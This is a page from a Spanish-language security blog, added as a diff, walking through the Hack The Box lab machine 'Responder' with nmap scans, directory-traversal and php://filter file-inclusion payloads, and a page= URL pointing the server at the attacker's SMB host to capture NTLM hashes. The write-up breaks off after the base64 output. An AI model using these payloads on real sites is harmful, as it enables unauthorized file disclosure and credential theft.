@@ -1,0 +1,506 @@
+<!-------------------------------------------------------------------------------->
+<!-------------------------------------------------------------------------------->
+
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=4e466187f8c7aec736a8844fc4931d346df15ea7">     <!-- Archivo CSS O SCSS Jekyll -->
+    <!-- <link rel="stylesheet" href="/assets/css/icon-style.css"> -->                                  <!-- Archivo CSS O SCSS del Buscador -->
+    <script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>           <!-- Archivo Java para importar fuentes -->
+
+  <!---------------------- Configuración de Colores ------------------------------->
+
+    <meta name="theme-color" content="#151515">
+    <meta name="msapplication-navbutton-color" content="#151515">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  <!--------------------- Begin Jekyll SEO tag v2.8.0 ----------------------------->
+
+   <title>F1r0x | Blog sobre Ciberseguridad.</title>
+   <link rel="icon" href="/assets/images/logoweb.ico">
+   <meta name="generator" content="Jekyll v3.9.2" />
+   <meta property="og:title" content="F1r0x" />
+   <meta property="og:locale" content="en_US" />
+   <meta name="description" content="Blog sobre Ciberseguridad." />
+   <meta property="og:description" content="Blog sobre Ciberseguridad." />
+   <link rel="canonical" href="https://f1r0x.github.io/Web/htb_responder.html" />         <!-- ¡¡¡ Cambiar !!!  -->
+   <meta property="og:url" content="https://f1r0x.github.io/Web/htb_responder.html" />    <!-- ¡¡¡ Cambiar !!!  -->
+   <meta property="og:site_name" content="F1r0x" />
+   <meta property="og:type" content="website" />
+   <meta name="twitter:card" content="summary" />
+   <meta property="twitter:title" content="F1r0x" />
+   <script type="application/ld+json">
+   {"@context":"https://schema.org","@type":"WebPage","description":"Blog sobre Ciberseguridad.","headline":"F1r0x","url":"https://f1r0x.github.io/portada.html"}</script>
+
+</head>
+
+<!--------------------------- Encabezado de la página ---------------------------------->
+
+<header>
+  <div class="container">
+    <a id="a-title" href="/">
+      <h5>F1r0x</h5>                                                                                                    <!-- Nombre del Autor -->                         
+    </a>
+    <h6>Blog sobre informática Y ciberseguridad.</h6>                                                                                 <!-- Descripción de la Página-->
+
+<!--------------------------------- Botón Github ---------------------------------------->    
+    <section id="downloads">         
+      <a href="https://github.com/F1r0x/f1r0x.github.io" class="btn btn-github"><span class="icon"></span>GitHub</a>    <!-- Contenido del botón Github -->
+    </section>
+  </div>
+</header>
+
+<!---------------------------------  Buscador  ------------------------------------------>
+
+<!--
+<body>
+<div id="a-buscador" class="buscar">
+  <input type="text" class="buscar_texto" placeholder="Escrive lo que buscas">
+  <a href="" class="boton">
+  <i class="icon-buscar"></i>
+  </a>
+</div>
+</body>
+-->
+
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+<!---------------------- Contenido del Cuerpo de la Página -------------------------------->  
+<!------------------------------ Botones y Efectos  --------------------------------------->
+<!----------------------------------------------------------------------------------------->
+
+<div class="container">
+  
+<!----------------------------- Imagen Hack The Box -------------------------------------->   
+
+<!--
+  <section id="main_content">
+    <p><a href="./hackthebox.html" style="text-decoration:none">
+          <img src="https://user-images.githubusercontent.com/103068924/186534363-a36084e5-2626-4b25-976c-ab2d232462f5.gif" align="middle" />
+       </a>
+    </p>
+  </section>
+-->
+
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+<!---------------------------- Contenido de la Página ------------------------------------->  
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162617408-a52c43fa-17f9-4b84-b875-2417a6381e7e.png" alt="HTB-Responder" /></p>
+
+<h1 id="htb-responder">HTB-RESPONDER</h1>
+<p>Resolución de la starting_point de HTB Responder.</p>
+
+<p>En primer lugar debemos asegurar que estamos conectados a la víctima y tratar de recopilar la máxima información posible.</p>
+
+<h2 id="ping">PING</h2>
+
+<p>Para verificar la conexión y tener una primera toma de contacto utilizaremos el comando <code class="language-plaintext highlighter-rouge">ping</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping [Ip Víctima]
+</code></pre></div></div>
+
+<p>Mediante este comando podemos obterner la siguiente información:</p>
+
+<ul>
+  <li>Verificar la conexión.</li>
+  <li>La latencia. Podemos observar el tiempo de recorrido de un paquete.</li>
+  <li>Podemos optener la Ip de un dominio.</li>
+  <li>Determinar si estamos frente a un SO Linux o Windows:
+  Windows ttl = 128
+  Linux ttl = 64</li>
+</ul>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162793073-6d60a6aa-c01b-4b66-b42b-f835402cd39d.png" alt="Captura de pantalla -2022-04-11 18-56-44" /></p>
+
+<p>Como podemos ver tenemos conexión ya que nos devuelve los paquetes enviados y tambien podemos determinar que estamos frente a una máquina Windows, ya
+que nos muestra un ttl=127.</p>
+
+<h2 id="nmap">NMAP</h2>
+
+<p>Tras conocer la máquina a la que nos enfrentamos pasaremos analizar los protocolos tcp/udp.</p>
+
+<p>Primero analizaremos lo puertos tcp ya que son los más utilizados y los más rápidos de escanear.</p>
+
+<p>Mediante nmap realizaremos varios escaneos, el primero será un analisis de todos los puertos abiertos del protocolo tcp.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162793045-8827ee25-bc83-44b0-8bb9-1c35eded3f38.png" alt="Captura de pantalla -2022-04-11 18-58-03" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -T5 -v -n [Ip Víctima] -oG allPorts
+</code></pre></div></div>
+
+<p>-p- : Escanea todo el rango de puertos.</p>
+
+<p>–open : Solo nos mostrará puertos con el estatus abierto.</p>
+
+<p>-T5 : Controla el tiempo y el rendimiento del escaneo donde 1 es el más lento  y 5 el más rápido.</p>
+
+<p>-v : Verbose. Recopila los puertos abiertos por TCP y los reporta por consola.</p>
+
+<p>-n : Anula la resolución DNS.</p>
+
+<p>-oG : Nos exporta los resultados en formato grepeable.</p>
+
+<p>allPorts : Es el archivo donde se guardan los resultados.</p>
+
+<p>Gracias a la función <code class="language-plaintext highlighter-rouge">extractPorts</code> podremos acceder en cualquier momento a los resultados guardados en el archivo <code class="language-plaintext highlighter-rouge">allPorts</code> y poder copiar y pegar
+  de forma ráìda sin tener que volver a realizar el escaneo.</p>
+
+<p>Podreís encontrar la función ‘extractPorts’ en mi repositorio.</p>
+
+<p>Realizamos el escaneo con nmap:</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162617839-1d17489e-72a4-4ecd-af53-da7447481361.png" alt="nmap2-HTB-REsponder" /></p>
+
+<p>Podemos ver como nos muestra tres puertos abiertos. Tras conocer los puertos TCP abiertos, realizaremos un segundo escaneo enfocado solo en los puertos
+abiertos para verla información que nos reportan y exportarlo en formato nmap al archivo <code class="language-plaintext highlighter-rouge">targed</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162792939-c44ed297-d464-4c6c-bc52-c65dabaa83d0.png" alt="Captura de pantalla -2022-04-11 19-01-25" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      nmap -sC -sV -p[Port1,Port2] [Ip Víctima] -oN target
+</code></pre></div></div>
+
+<p>-sC : Lanza scrips básicos de reconocimiento.</p>
+
+<p>-sV : Localiza la versión y servicio de los puertos definidos.</p>
+
+<p>-p : Puertos a escanear.    Ej:  -p80,5985,7680</p>
+
+<p>-oN : Reporta los resultados en formato nmap al archivo ‘target’.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162792891-3feca646-e0be-44fe-bbdc-e3efa5aa1865.png" alt="Captura de pantalla -2022-04-11 19-03-52" /></p>
+
+<p>Ya tenemos un poco más de información, podemos ver como el puerto 80 tiene un servicio http.
+Vamos a tratar de comprobar en el navegador si podemos acceder algún dominio mediante la ip
+de la máquina.</p>
+
+<p>Para ello nos dirigiremos al navegador (en mi caso firefox) y al tratarse de un sevicio http introduciremos la siguiente url:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://[Ip Víctima]
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162795151-ad70832b-42d8-4e45-96ce-f0ce3dce181d.png" alt="Captura de pantalla -2022-04-11 19-20-45" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162795451-2bbc001e-ea35-40a4-a27e-904c7cbce53d.png" alt="Captura de pantalla -2022-04-08 09-53-42" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162796155-5962787f-1619-437a-bc8c-8c5b365ff4dc.png" alt="Captura de pantalla -2022-04-08 09-54-10" /></p>
+
+<p>Como podemos ver, la dirección no nos carga, pero al fijarnos en la url vemos que nos redirige a una página llamada  ‘unika.htb’. Tener en cuenta que
+firefox al no poder cargar la página en http automáticamente cambia a https para tambien tratar de cargar. Por eso que en firefox al tratar
+de cargar la página finalmente nos muestra https pero la página a la que tenemos que acceder es:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb
+</code></pre></div></div>
+
+<p>Al igual que en máquinas anteriores, vamos a tratar de introducir los datos del dominio en nuestra carpeta de hosts para ver si podemos cargar la paǵina.</p>
+
+<p>Para ello nos dirigiremos al directorio ‘/etc/hosts’ y introduciremos la Ip de la vítima y el host al que corresponde:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano /etc/hosts
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162798184-53e76dbb-ed24-4b98-9729-efc9b04efa3b.png" alt="Captura de pantalla -2022-04-11 19-39-18" /></p>
+
+<p>Introducimos al final del archivola ip y el nombre del host (unika.htb) separados por un espacio.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162798145-483adee5-9d1d-4e36-8f7f-4abbe371e1e2.png" alt="Captura de pantalla -2022-04-11 19-40-46" /></p>
+
+<p>Guardamos: Cntrl + o</p>
+
+<p>Salimos: Cntrl + x</p>
+
+<p>Una vez terminado esto, regresamos a nuestro navegador y tratamos de recargar la página <code class="language-plaintext highlighter-rouge">http://unika.htb</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162798526-041b6223-048d-43d7-a4bf-3610c6f95e71.png" alt="Captura de pantalla -2022-04-08 10-20-23" /></p>
+
+<p>Genial, ya tenemos acceso a la página. Como podemos ver, se trata de una empresa de diseño y estetica web.
+Ahora vamos a tratar de revisar la página para buscar algo que nos pueda servir.</p>
+
+<p>Despues de estar un rato revisando la página veo que la unica pestaña que parece hacer algo es la EN, que nos ofrece poder cambiar de idioma.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162803508-7136d632-8a13-4123-98f1-47d6375ed705.png" alt="Captura de pantalla -2022-04-11 20-09-20" /></p>
+
+<p>Al cambiar al frances (FR) o al alemán (DE), algo interesante es que la página cambia de url y nos redirige a una página html (más vulnerable).</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162803532-ac1ae87d-fcb3-4f96-aafc-ecc2a8c9306a.png" alt="Captura de pantalla -2022-04-11 20-15-17" /></p>
+
+<p>Los sitios web dinámicos incluyen páginas HTML sobre la marcha utilizando información de la solicitud HTTP para incluir parámetros GET y POST, cookies
+y otras variables. Es común que una página incluya otra página en función de algunos de estos parámetros.</p>
+
+<p>Para tratar de acceder al sistema, vamos a utilizar una tecnica conocida como Local Fail Intrusion LFI.</p>
+
+<h2 id="local-fail-intrusion">Local Fail Intrusion</h2>
+
+<p>Un local fail intrusion (inclusión de archivos locales) ocurre cuando un atacante puede hacer que un sitio web incluya un archivo que posteriormente
+utilizará en su beneficio.</p>
+
+<p>Si la aplicación trata esta entrada como confiable y no se realizan las comprobaciones de seguridad requeridas en esta entrada, entonces el atacante
+puede explotarla usando la cadena ../ en el nombre de la página ingresada y eventualmente ver los archivos confidenciales en el sistema de archivos
+local.</p>
+
+<p>La cadena <code class="language-plaintext highlighter-rouge">../</code> se usa para recorrer un directorio hacia atras, uno a la vez. Por lo tanto, se incluyen varias cadenas <code class="language-plaintext highlighter-rouge">../</code> en la URL para que el
+controlador de archivos en el servidor vuelva al directorio base, es decir, <code class="language-plaintext highlighter-rouge">C:</code>.</p>
+
+<p>Luego, cargaremos un archivo remoto en el host proporcionandole un nombre comun en windows para que el sistema no pueda detectarlo como malicioso.</p>
+
+<p>Uno de los archivos más comunes a los que un probador de penetración podría intentar acceder en una máquina con Windows para verificar LFI es el
+archivo de ‘hosts’.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WINDOWS/System32/drivers/etc/hosts
+</code></pre></div></div>
+
+<p>(Este archivo ayuda en la traducción local de nombres de host a direcciones IP).</p>
+
+<p>En nuestro caso vemos que al cambiar de idioma al frances (FR) se nos muestra una <code class="language-plaintext highlighter-rouge">page=</code> en la url. Aquí es donde mediante la cadena <code class="language-plaintext highlighter-rouge">../</code>
+retrocederemos hasta el directorio inicial y luego nos dirigiremos al archivo <code class="language-plaintext highlighter-rouge">hosts</code>. Para ello introduciremos las siguientes ordenes en la url.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162816667-ebe0d677-98bc-43bf-8470-ad7a6f6383ad.png" alt="Captura de pantalla -2022-04-11 21-38-44" /></p>
+
+<p>Como se puede ver, el Local File Inclusion es posible ya que podemos ver el contenido del archivo <code class="language-plaintext highlighter-rouge">host</code> en situado en el directorio
+<code class="language-plaintext highlighter-rouge">C:/windows/system32/drivers/etc/hosts</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162816016-aa5b7b18-5f76-497a-82f3-ea4a9cb5211e.png" alt="Captura de pantalla -2022-04-11 21-33-58" /></p>
+
+<p>Esto es posible porque en el backend se usa el método ‘include()’ de PHP para añadir las URL de las página web de otros idiomas. Y debido a que no se
+realiza una desinfección adecuada en este parámetro, pudimos pasar entradas maliciosas y ver los archivos internos del sistema.</p>
+
+<h2 id="include">Include()</h2>
+
+<p>El metodo <code class="language-plaintext highlighter-rouge">include()</code> en php, toma todo el texto/código/marcado que existe en el archivo especificado y lo carga en la memoria, haciéndolo disponible
+para su uso.</p>
+
+<p>Sabemos que esta página web es vulnerable a la vulnerabilidad de inclusión de archivos y se sirve ben un máquina de ventanas. Por lo tanto, existe la
+posibilidad de incluir un archivo en la estación de trabajo de nuestro atacante.</p>
+
+<p>Podemos utilizar un protocolo como SMB para que Windows intente autenticarse en nuestra máquina y poder capturar el <code class="language-plaintext highlighter-rouge">NetNTLMv2</code>.</p>
+
+<h2 id="ntlm">NTLM</h2>
+
+<p>NTLM es una colección de protocolos de autenticación creados por Microsoft.</p>
+
+<p>El proceso de autenticación NTLM se realiza de la siguiente manera:</p>
+
+<ol>
+  <li>
+    <p>El cliente envía el nombre de usuario y el nombre de dominio al servidor.</p>
+  </li>
+  <li>
+    <p>El servidor genera una cadena de caracteres aleatorios, denominada desafío y la devuelve al cliente.</p>
+  </li>
+  <li>
+    <p>El cliente cifra el desafío con el hash NTLM de la contraseña del usuario y lo envía de vuelta al servidor.</p>
+  </li>
+  <li>
+    <p>El servidor recupera la contraseña de usuario (o equivalente).</p>
+  </li>
+  <li>
+    <p>El servidor utiliza el valor hash recuperado de la base de datos de la cuenta de seguridad
+para cifrar la cadena de desafío. Luego, el valor se compara con el valor recibido del cliente.
+Si los valores coinciden, el cliente se autentica.</p>
+  </li>
+</ol>
+
+<p>En el archivo de configuración <code class="language-plaintext highlighter-rouge">php.ini</code> de la maquina, si <code class="language-plaintext highlighter-rouge">allow_url_include</code> está configurado en <code class="language-plaintext highlighter-rouge">Desactivado</code>
+ de forma predeterminada indica que PHP no carga URL HTTP o FTP remotas para evitar ataques de inclusión
+ de archivos remotos.</p>
+
+<p>Sin embargo, incluso si allow_url_include y allow_url_fopen están configurados en <code class="language-plaintext highlighter-rouge">Off</code>, PHP no impedirá
+ la carga de URL de SMB.</p>
+
+<p>En nuestro caso, podemos hacer un mal uso de esta funcionalidad para robar el hash NTLM.</p>
+
+<p>Ahora, podemos intentar cargar una URL de SMB y capturar los valores hash del objetivo mediante ‘Responder’.</p>
+
+<h2 id="herramienta-responder">Herramienta Responder</h2>
+
+<p>Responder es una herramienta que puede realizar muchos tipos diferentes de ataques, pero para este escenario,
+ configurará un servidor SMB malicioso.</p>
+
+<p>Cuando la máquina de destino intenta realizar la autenticación NTLM en ese servidor, Responder devuelve un 
+ desafío para que el servidor cifre con la contraseña del usuario.</p>
+
+<p>Cuando el servidor responde, Responder utilizará el desafío y la respuesta cifrada para generar el NetNTLMv2.</p>
+
+<p>Si bien no podemos revertir NetNTLMv2, podemos probar muchas contraseñas comunes diferentes para ver si 
+ alguna genera la misma respuesta de desafío y, si encontramos una, sabemos que esa es la contraseña.</p>
+
+<p>Esto a menudo se conoce como descifrado de hash, lo que haremos con un programa llamado <code class="language-plaintext highlighter-rouge">John The Ripper</code>.</p>
+
+<p>Primero nos clonaremos el repositorio de la herramienta Responder del siguiente repositorio:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo git clone https://github.com/SpiderLabs/Responder
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162826505-7365e10f-5098-48a6-9442-97f614dfd888.png" alt="Captura de pantalla -2022-04-11 22-28-50" /></p>
+
+<p>Recordar que el repositorio <code class="language-plaintext highlighter-rouge">Responder</code> se clonara el directorio en el que nos encontremos. 
+ Ahora podemos ver como dentro del directorio ‘Responder’ se han clonado los siguientes archivos:</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162827046-93ba9dfa-fbe9-4396-bbaa-af556f168f95.png" alt="Captura de pantalla -2022-04-11 22-31-04" /></p>
+
+<p>Ahora vamosa a comprobar que en archivo ‘Responder.conf’ tenemos configurados los parametros de escucha
+ SQL y SMB en On. Para ver el archivo podemos utilizar el comando ‘cat’ y para modificarlo el comando ‘nano’.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano Responder.conf
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162829073-13d21638-c3a8-4f37-a686-eec04a244055.png" alt="Captura de pantalla -2022-04-11 22-45-54" /></p>
+
+<p>En caso de estar en modo off lo cambiamos al on, guardamos (Cntrl + o) y salimos (Cntrl + x).</p>
+
+<p>Ya tendriamos la herramienta Responder preparada. Ahora debemos iniciar Responder con python3 y utilizar el indicado <code class="language-plaintext highlighter-rouge">-I</code> para activar el modo escucha.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 Responder.py -I tun0 
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162831086-07194fd6-8afb-40a1-ad6f-1b65af7975be.png" alt="Captura de pantalla -2022-04-11 22-58-20" /></p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162831102-c08c5c76-bac8-4c54-821b-466124bfd0eb.png" alt="Captura de pantalla -2022-04-11 22-59-03" /></p>
+
+<p>Una vez tenemos el Responder listo y en escucha, debemos configurar un parámetro dentro del servidor de la máquina para que incluya un recurso de
+ nuestro servidor SMB.</p>
+
+<p>Este parámetro lo configuraremos mediante el navegador web. Para ello incluiremos nuestra ip (tun0) lo cual podemos ver mediante el comando <code class="language-plaintext highlighter-rouge">ifconfig</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/?page=//[Ip de nuestra tun0]/somefile
+</code></pre></div></div>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162841324-0250adad-5f7f-49ed-b487-81740e71a37a.png" alt="Captura de pantalla -2022-04-12 00-04-50" /></p>
+
+<p>Tras intentar realizar la escucha varias veces y recargar la página no consdigo establecer la conexión.
+He revisado varias veces la configuración y por algún motivo Responder no me funciona.</p>
+
+<h1 id="file-local-inlcusion-php">File Local Inlcusion PHP</h1>
+
+<p>Así que tras ver que con Responder no podía, empece a buscar vulnerabilidades comunes de File Local Intrusion
+y tras mucho investigar encontre una intrusión conocida como wrapper <code class="language-plaintext highlighter-rouge">php//filter</code>.</p>
+
+<p>Donde básicamente mediante el buscador, incluimos una dirección que nos reporta el hash en base64.
+Tras probar las distintas obciones, está fue la que me funciono a mi:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>page=php://filter/convert.base64-encode/resource=index.php
+</code></pre></div></div>
+
+<p>Aqui podeís encontrar más información y más vulnerabilidades de Local File Intrusion PHP:
+<a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</a></p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162842965-294ea05b-12cf-4ec2-a433-38b95db263a9.png" alt="Captura de pantalla -2022-04-12 00-21-23" /></p>
+
+<p>Lo introduciomos en el buscador:</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162843528-2e662ba0-3eac-4d45-9d45-baf37a28d250.png" alt="Captura de pantalla -2022-04-12 00-26-52" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</code></pre></div></div>
+
+<p>Y al recargar la página podemos ver como se nos reporta un hash en base64.</p>
+
+<p><img src="https://user-images.githubusercontent.com/103068924/162844358-0814ecd9-5089-43f5-abdc-b0aa0a863e9c.png" alt="Captura de pantalla -2022-04-12 00-35-10" /></p>
+
+<p>Lo copiaremos para poder pasarlo a una terminar y tratar de descifrarlo.</p>
+
+
+
+
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+<!---------------------------- Fin del contenido de la Página ----------------------------->  
+<!----------------------------------------------------------------------------------------->
+<!----------------------------------------------------------------------------------------->
+
+
+<!----------------------------------  Menu lateral  --------------------------------------->
+
+<body id="body">
+    
+<div class="icon__menu">
+<i class="fas fa-bars" id="btn_open"></i>
+</div>
+
+<div class="menu__side" id="menu_side">
+
+<!--- Botón Youtube --- 
+<div class="name__page">
+<i class="fab fa-youtube"></i>
+<h4>F1r0x</h4>
+</div>
+-->
+
+<div class="options__menu">	
+
+<a href="../portada.html" class="selected">
+<div class="option">
+<i class="fas fa-home" title="Inicio"></i>
+<h4>Inicio</h4>
+</div>
+</a>
+
+<a href="./articulos.html">
+<div class="option">
+<i class="far fa-file" title="Artículos"></i>
+<h4>Artículos</h4>
+</div>
+</a>
+            
+<a href="./cursos.html">
+<div class="option">
+<i class="fas fa-video" title="Cursos"></i>
+<h4>Cursos</h4>
+</div>
+</a>
+
+<a href="./hackthebox.html">
+<div class="option">
+<i class="far fa-sticky-note" title="Hack the Box"></i>
+<h4>HTB</h4>
+</div>
+</a>
+
+<a href="./contacto.html">
+<div class="option">
+<i class="far fa-id-badge" title="Contacto"></i>
+<h4>Contacto</h4>
+</div>
+</a>
+
+<a href="./referencias.html">
+<div class="option">
+<i class="far fa-address-card" title="Referencias"></i>
+<h4>Referencias</h4>
+</div>
+</a>
+
+</div>
+
+</div>
+
+<script src="../js/script.js"></script>  <!-- Archivo Java para el menú lateral responsive -->
+</body>
+
+<!-------------------------------------  Gestor de Comentrarios  ---------------------------------->
+
+<html lang="en">
+  <div id="comentarios">
+    <body>
+      <script src="https://utteranc.es/client.js" repo="F1r0x/gestion-comentarios" issue-term="pathname" theme="github-light" crossorigin="anonymous" async="">
+      </script>         
+    </body>
+  </div>
+</html>
+
+<!-------------------------------------------------------------------------------------------------->
+
+    </div>
+</html>
+<hr />
+
+<!------------------------------------------------------------------------------------------------->
+<!------------------------------------------------------------------------------------------------->
